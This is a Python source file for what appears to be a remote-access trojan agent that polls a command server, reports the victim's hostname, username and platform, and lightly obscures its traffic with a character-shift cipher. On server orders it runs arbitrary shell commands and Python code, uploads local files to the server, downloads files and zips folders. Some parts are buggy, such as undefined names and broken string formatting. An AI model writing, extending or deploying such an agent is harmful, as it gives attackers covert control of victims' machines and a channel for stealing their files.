import requests
import time
import os
import subprocess
import platform
import sys
import traceback
import threading
import uuid
from io import StringIO
import zipfile
import socket
import getpass

SERVER = "http://127.0.0.1:8080"
HELLO_INTERVAL = 10
IDLE_TIME = 90

MAX_FAILED_CONNECTIONS = 10
PLATFORM = platform.system()


def threaded(func):
    def wrapper(*_args, **kwargs):
        t = threading.Thread(target=func, args=_args)
        t.start()
        return

    return wrapper

def crypts(strink):
    str1 = strink.split()
    str2 = []
    for i in range(0, len(strink)):
        newint = ord(strink[i])
        newint2 = newint + 2
        new = chr(newint2)
        str2.append(new)
    
    return ''.join(str2 [::-1])

def decrypts(strink):
    str1 = strink.split()
    str2 = []
    for i in range(0, len(strink)):
        newint = ord(strink[i])
        newint2 = newint -2
        new = chr(newint2)
        str2.append(new)
    return ''.join(str2 [::-1])

class Agent(object):
    def __init__(self):
        self.idle = True
        self.silent = False
        self.platform = platform.system() + " " + platform.release()
        self.last_active = time.time()
        self.failed_connections = 0
        self.uid = self.get_UID()
        self.hostname = socket.gethostname()
        self.username = getpass.getuser()


    def get_consecutive_failed_connections(self):
        check_file = os.path.join("failed_connections")
        if os.path.exists(check_file):
            with open(check_file, "r") as f:
                return int(f.read())
        else:
            return 0

    def update_consecutive_failed_connections(self, value):
        check_file = os.path.join("failed_connections")
        with open(check_file, "w") as f:
            f.write(str(value))

    def get_UID(self):
        """ Returns a unique ID for the agent """
        return crypts(getpass.getuser() + "_" + str(uuid.getnode()))

    def server_hello(self):
        """ Ask server for instructions """
        req = requests.post(
            SERVER + "/api/" + self.uid + "/hello",
            json={
                "platform": self.platform,
                "hostname": self.hostname,
                "username": self.username,
            }
        )
        print(req.text)
        return decrypts(req.text)

    def send_output(self, out):
        """ Send console output to server """
        req = requests.post(
            SERVER + "/api/" + self.uid + "/report", data={"output": crypts("\n" + out + "\n")}
        )

    def expand_path(self, path):
        """ Expand environment variables and metacharacters in a path """
        return os.path.expandvars(os.path.expanduser(path))

    @threaded
    def runcmd(self, cmd):
        """ Runs a shell command and returns its output """
        try:
            proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = proc.communicate()
            output = (out + err)
            self.send_output(output.decode())
            return output
        except Exception as exc:
            print(traceback.format_exc())
            self.send_output(traceback.format_exc())
            
    @threaded
    def python(self, command_or_file):
        """ Runs a python command or a python file and returns the output """
        new_stdout = StringIO.StringIO()
        old_stdout = sys.stdout
        sys.stdout = new_stdout
        new_stderr = StringIO.StringIO()
        old_stderr = sys.stderr
        sys.stderr = new_stderr
        if os.path.exists(command_or_file):
            self.send_output("[*] Running python file...")
            with open(command_or_file, "r") as f:
                python_code = f.read()
                try:
                    exec(python_code)
                except Exception as exc:
                    self.send_output(traceback.format_exc())
        else:
            self.send_output("[*] Running python command...")
            try:
                exec(command_or_file)
            except Exception as exc:
                self.send_output(traceback.format_exc())
        sys.stdout = old_stdout
        sys.stderr = old_stderr
        self.send_output(new_stdout.getvalue() + new_stderr.getvalue())

    def cd(self, directory):
        """ Change current directory """
        os.chdir(self.expand_path(directory))

    @threaded
    def upload(self, file):
        """ Uploads a local file to the server """
        file = self.expand_path(file)
        try:
            if os.path.exists(file) and os.path.isfile(file):
                self.send_output("[*] Uploading %s..." % file)
                requests.post(
                    SERVER + "/api/" + self.uid + "/upload",
                    files={"uploaded": open(file, "rb")},
                )
            else:
                self.send_output("[!] No such file: " + file + "\n")
        except Exception as exc:
            self.send_output(traceback.format_exc())

    @threaded
    def download(self, file, destination=""):
        """ Downloads a file the the agent host through HTTP(S) """
        try:
            destination = self.expand_path(destination)
            if not destination:
                destination = file.split("/")[-1]
            self.send_output("[*] Downloading %s..." % file)
            req = requests.get(file, stream=True)
            with open(destination, "wb") as f:
                for chunk in req.iter_content(chunk_size=8000):
                    if chunk:
                        f.write(chunk)
            self.send_output("[+] File downloaded: " + destination + "\n")
        except Exception as exc:
            self.send_output(traceback.format_exc())

    def exit(self):
        """ Kills the agent """
        self.send_output("[+] Exiting... (bye!)" + "\n")
        sys.exit(0)

    @threaded
    def zip(self, zip_name, to_zip):
        """ Zips a folder or file """
        try:
            zip_name = self.expand_path(zip_name)
            to_zip = self.expand_path(to_zip)
            if not os.path.exists(to_zip):
                self.send_output("[+] No such file or directory: %s"  + "\n" % to_zip)
                return
            self.send_output("[*] Creating zip archive..."  + "\n")
            zip_file = zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED)
            if os.path.isdir(to_zip):
                relative_path = os.path.dirname(to_zip)
                for root, dirs, files in os.walk(to_zip):
                    for file in files:
                        zip_file.write(
                            os.path.join(root, file),
                            os.path.join(root, file).replace(relative_path, "", 1),
                        )
            else:
                zip_file.write(to_zip, os.path.basename(to_zip))
            zip_file.close()
            self.send_output("[+] Archive created: %s"  + "\n" % zip_name)
        except Exception as exc:
            self.send_output(traceback.format_exc())

    @threaded
    def help(self):
        """ Displays the help """
        self.send_output(HELP)

    def run(self):
        """ Main loop """
        while True:
            try:
                todo = self.server_hello()
                self.update_consecutive_failed_connections(0)
                # Something to do ?
                time.sleep(HELLO_INTERVAL)
                if todo != "x":
                    print("test")
                    commandline = todo
                    self.idle = False
                    self.last_active = time.time()
                    if commandline != 'v\x08':
                        self.send_output("#\> " + commandline)
                    else:
                        pass
                    split_cmd = commandline.split(" ")
                    command = split_cmd[0]
                    args = []
                    if len(split_cmd) > 1:
                        args = split_cmd[1:]
                    try:
                        if command == "cd":
                            if not args:
                                self.send_output("usage: cd ")
                            else:
                                self.cd(args[0])
                        elif command == "upload":
                            if not args:
                                self.send_output("usage: upload ")
                            else:
                                self.upload(
                                    args[0],
                                )
                        elif command == "download":
                            if not args:
                                self.send_output("usage: download  ")
                            else:
                                if len(args) == 2:
                                    self.download(args[0], args[1])
                                else:
                                    self.download(args[0])
                        elif command == "exit":
                            self.exit()
                        elif command == "zip":
                            if not args or len(args) < 2:
                                self.send_output("usage: zip  ")
                            else:
                                self.zip(args[0], " ".join(args[1:]))
                        elif command == "python":
                            if not args:
                                self.send_output("usage: python  or python ")
                            else:
                                self.python(" ".join(args))
                        elif command == "help":
                            self.help()
                        else:
                            if commandline != 'x' and commandline !='v\x08':
                                print(commandline)
                                self.runcmd(commandline)
                            else:
                                pass
                    except Exception as exc:
                        self.send_output(traceback.format_exc())
                else:
                    if self.idle:
                        time.sleep(HELLO_INTERVAL)
                    elif (time.time() - self.last_active) > IDLE_TIME:
                        self.log("Switching to idle mode...\n")
                        self.idle = True
                    else:
                        time.sleep(0.5)
            except Exception as exc:
                failed_connections = self.get_consecutive_failed_connections()
                failed_connections += 1
                self.update_consecutive_failed_connections(failed_connections)
                time.sleep(HELLO_INTERVAL)

agent = Agent()
agent.run()
